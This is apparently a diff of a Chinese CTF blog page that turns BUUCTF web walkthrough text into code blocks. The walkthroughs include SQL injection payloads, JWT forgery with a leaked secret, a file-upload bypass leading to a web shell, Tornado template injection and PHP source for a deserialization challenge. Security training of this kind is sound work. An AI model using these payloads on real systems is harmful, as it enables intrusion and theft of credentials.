@@ -409,7 +409,7 @@
 <meta property="og:image" content="https://colourful228.github.io/2026/02/10/BUUCTF/image-20260427184832892.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/02/10/BUUCTF/image-20260427184829803.png">
 <meta property="article:published_time" content="2026-02-10T15:36:49.000Z">
-<meta property="article:modified_time" content="2026-06-06T13:11:29.942Z">
+<meta property="article:modified_time" content="2026-07-12T06:09:58.063Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="BUU">
 <meta name="twitter:card" content="summary_large_image">
@@ -802,7 +802,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-06-06T21:11:29+08:00
+                    本文最后更新于 2026-07-12T14:09:58+08:00
                   
                   
 
@@ -850,17 +850,19 @@
 <p>一个登录界面尝试万能密码</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210233938842.png" srcset="/img/loading.gif" lazyload alt="image-20260210233938842"></p>
 <p>报错：<strong>Warning</strong>: SQLite3::query(): Unable to prepare statement: 1, near “‘ AND password &#x3D; ‘“: syntax error in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>36</strong></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=admin&#x27;order+by+<span class="hljs-number">2</span>#&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=admin<span class="hljs-string">&#x27;order+by+2#&amp;password=1</span><br></code></pre></td></tr></table></figure>
 
 <p>测试列数</p>
 <p>报错：SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;#&quot; in</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">username=admin<span class="hljs-symbol">&#x27;order</span>+by+<span class="hljs-number">4</span><span class="hljs-comment">--+&amp;password=1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=admin<span class="hljs-string">&#x27;order+by+4--+&amp;password=1</span><br></code></pre></td></tr></table></figure>
 
 <p>报错：SQLite3::query(): Unable to prepare statement: 1, 1st ORDER BY term out of range - should be between 1 and 3 in </p>
 <p>说明是列数为3</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=admin&#x27;union+select+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=admin<span class="hljs-string">&#x27;union+select+1,2,3--+&amp;password=1</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/02/10/BUUCTF/image-20260210233948477.png" srcset="/img/loading.gif" lazyload alt="image-20260210233948477">回显的是auth_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ndW5pb24gc2VsZWN0IDEsMiwzLS0gIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY1NDUyODMyfQ.QMECTceQzeTss9mP6EMyTiq1OO5suxsW8a7N75Csas8</p>
+<p><img src="/2026/02/10/BUUCTF/image-20260210233948477.png" srcset="/img/loading.gif" lazyload alt="image-20260210233948477">回显的是</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auth_token</span>=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ndW5pb24gc2VsZWN0IDEsMiwzLS0gIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY1NDUyODMyfQ.QMECTceQzeTss9mP6EMyTiq1OO5suxsW8a7N75Csas8<br></code></pre></td></tr></table></figure>
+
 <p>这是JWT鉴权，可以利用在线网站解</p>
 <p>网站：<a target="_blank" rel="noopener" href="https://jwt.calebb.net/">https://jwt.calebb.net/</a></p>
 <p>感觉像一串编码</p>
@@ -868,12 +870,21 @@
 <p>虽然感觉不像但还是尝试了base64解码</p>
 <p>返回值为{“typ”:”JWT”,”alg”:”HS256”}{“user”:”admin’union select 1,2,3– “,”role”:”guest”,”iat”:1765452832}</p>
 <p>解析</p>
-<p>“typ”:”JWT”：声明这个令牌的类型是JWT</p>
-<p>“alg”:”HS256”：声明这个JWT的签名算法是HMAC SHA-256（这是一种对称加密算法，签名和验签需要使用同一个密钥</p>
-<p>“user”:”admin’union select 1,2,3– “：这里嵌入了我输入的sql注入的payload</p>
-<p>“role”:”guest”：当前身份是用户角色，当前是访客权限</p>
-<p>username&#x3D;admin’union+select+1,database(),3–+&amp;password&#x3D;1</p>
-<p>报错：SQLite3::query(): Unable to prepare statement: 1, no such function: database in </p>
+<ul>
+<li><p>“typ”:”JWT”：声明这个令牌的类型是JWT</p>
+</li>
+<li><p>“alg”:”HS256”：声明这个JWT的签名算法是HMAC SHA-256（这是一种对称加密算法，签名和验签需要使用同一个密钥</p>
+</li>
+<li><p>“user”:”admin’union select 1,2,3– “：这里嵌入了我输入的sql注入的payload</p>
+</li>
+<li><p>“role”:”guest”：当前身份是用户角色，当前是访客权限</p>
+</li>
+</ul>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">username=admin<span class="hljs-symbol">&#x27;union</span>+<span class="hljs-keyword">select</span>+<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-comment">--+&amp;password=1</span><br></code></pre></td></tr></table></figure>
+
+<p>报错：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">SQLite3::query(): Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">prepare</span> statement: <span class="hljs-number">1</span>, <span class="hljs-keyword">no</span> such <span class="hljs-keyword">function</span>: database <span class="hljs-keyword">in</span> <br></code></pre></td></tr></table></figure>
+
 <p>解析：当前数据库SQLite3不支持database()函数</p>
 <table>
 <thead>
@@ -895,14 +906,18 @@
 <td>DB_NAME()</td>
 </tr>
 </tbody></table>
-<p>username&#x3D;admin’union+select+1,sqlite_master,3–+&amp;password&#x3D;1</p>
-<p>报错：SQLite3::query(): Unable to prepare statement: 1, no such column: sqlite_master in</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">username=admin<span class="hljs-symbol">&#x27;union</span>+<span class="hljs-keyword">select</span>+<span class="hljs-number">1</span>,sqlite_master,<span class="hljs-number">3</span><span class="hljs-comment">--+&amp;password=1</span><br></code></pre></td></tr></table></figure>
+
+<p>报错：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">SQLite3::query(): Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">prepare</span> statement: <span class="hljs-number">1</span>, <span class="hljs-keyword">no</span> such <span class="hljs-keyword">column</span>: sqlite_master <span class="hljs-keyword">in</span><br></code></pre></td></tr></table></figure>
+
 <p>解析：sqlite_master是核心系统表，正常情况下所有 SQLite3 数据库都存在这个表</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234006147.png" srcset="/img/loading.gif" lazyload alt="image-20260210234006147"></p>
 <p>登录成功，查看源码</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234010310.png" srcset="/img/loading.gif" lazyload alt="image-20260210234010310"></p>
-<p>这些就是密钥</p>
-<p>GALLERY2024SECRET</p>
+<p>这些就是密钥（这里有一点点脑洞了</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">GALLERY2024SECRET<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234014064.png" srcset="/img/loading.gif" lazyload alt="image-20260210234014064"></p>
 <p>校验成功，就可以伪造admin</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234018966.png" srcset="/img/loading.gif" lazyload alt="image-20260210234018966"></p>
@@ -912,11 +927,14 @@
 <p>打开是一个登陆界面就想到sql注入</p>
 <p>万能密码尝试一下admin’or 1&#x3D;’1’</p>
 <p>报错</p>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘111’’ at line 1</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">You have an error in your SQ<span class="hljs-class">L syntax;</span><span class="hljs-built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;111&#x27;&#x27; at line 1<br></code></pre></td></tr></table></figure>
+
 <p>在password注入点注入</p>
-<p>111’order by 2–+</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">111</span>&#x27;<span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span>--+<br></code></pre></td></tr></table></figure>
+
 <p>报错</p>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’ at line 1</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">You have an error in your SQ<span class="hljs-class">L syntax;</span><span class="hljs-built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1<br></code></pre></td></tr></table></figure>
+
 <p>说明是单引号的闭合有问题，可以判断闭合方式可能是单引号</p>
 <p>验证一下，去掉单引号，不报错只显示用户名密码错误</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234040841.png" srcset="/img/loading.gif" lazyload alt="image-20260210234040841"></p>
@@ -925,7 +943,9 @@
 <p><img src="/2026/02/10/BUUCTF/image-20260210234048973.png" srcset="/img/loading.gif" lazyload alt="image-20260210234048973"></p>
 <p>在password处注入万能密码</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234053048.png" srcset="/img/loading.gif" lazyload alt="image-20260210234053048"></p>
-<p>依旧报错You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’ at line 1</p>
+<p>依旧报错</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">You have an error in your SQ<span class="hljs-class">L syntax;</span><span class="hljs-built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234057657.png" srcset="/img/loading.gif" lazyload alt="image-20260210234057657"></p>
 <p>回显成功</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234101682.png" srcset="/img/loading.gif" lazyload alt="image-20260210234101682"></p>
@@ -1122,7 +1142,8 @@
 <p><img src="/2026/02/10/BUUCTF/image-20260210234613138.png" srcset="/img/loading.gif" lazyload alt="image-20260210234613138"></p>
 <p>传入参数47是&#x2F;的ASSCII码值</p>
 <p>得到f1aggg文件</p>
-<p>? num&#x3D;show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">? num=show_source(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234616515.png" srcset="/img/loading.gif" lazyload alt="image-20260210234616515"></p>
 <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>传文件，发现&lt;?被过滤了</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234619948.png" srcset="/img/loading.gif" lazyload alt="image-20260210234619948"></p>
@@ -1138,7 +1159,9 @@
 
 <p>这里要用幻术头绕过一下，上传成功了，再传一句话木马</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234650882.png" srcset="/img/loading.gif" lazyload alt="image-20260210234650882"></p>
-<p>然后访问&#x2F;uploads&#x2F;331f5a2fec4659f9c8cd3a470a780b69&#x2F;index.php</p>
+<p>然后访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/uploads/331f5a2fec4659f9c8cd3a470a780b69/index.php<br></code></pre></td></tr></table></figure>
+
 <p>进行rce</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234655596.png" srcset="/img/loading.gif" lazyload alt="image-20260210234655596"></p>
 <h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure>
@@ -1161,15 +1184,20 @@
 <p>hints.txt</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234727208.png" srcset="/img/loading.gif" lazyload alt="image-20260210234727208"></p>
 <p>要对 cookie_secret和md5加密后的(filename)再次进行md5加密  </p>
-<p>?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;6023d8b20b0e0edd869292cbcbc845e5</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=/fllllllllllllag&amp;filehash=6023d8b20b0e0edd869292cbcbc845e5<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234730657.png" srcset="/img/loading.gif" lazyload alt="image-20260210234730657"></p>
 <p>在url中输入什么就会回显什么，再看题目名字就想到是模板注入</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234738426.png" srcset="/img/loading.gif" lazyload alt="image-20260210234738426"></p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234735447.png" srcset="/img/loading.gif" lazyload alt="image-20260210234735447"></p>
-<p>?msg&#x3D;</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?msg=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
 <p>得到cookie_secret的值加上(filename)md5加密后的值再次加密</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234745906.png" srcset="/img/loading.gif" lazyload alt="image-20260210234745906"></p>
-<p>?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;b4e93a7e834694937375ae2505bc9290</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=/fllllllllllllag&amp;filehash=b4e93a7e834694937375ae2505bc9290<br></code></pre></td></tr></table></figure>
+
+
+
 <h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>        <span class="hljs-keyword">die</span>();<br>      &#125;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>      <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>      <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>  &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>  <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>  &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>代码审计</p>
@@ -1187,37 +1215,54 @@
